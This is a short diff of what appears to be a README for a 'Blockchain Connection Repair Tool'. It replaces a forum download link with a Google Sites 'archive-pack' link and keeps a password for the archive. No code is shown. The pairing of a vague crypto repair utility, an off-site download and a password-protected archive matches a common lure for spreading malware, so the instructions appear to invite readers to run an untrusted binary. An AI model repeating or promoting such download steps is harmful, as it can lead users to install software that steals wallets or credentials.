@@ -30,9 +30,9 @@ Blockchain Connection Repair Tool is a professional utility for developers and n
 
 Download the latest release from the link below.
 
-Download: https://software-hub.forumotion.com/t84-blockchain-connection-repair-tool
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
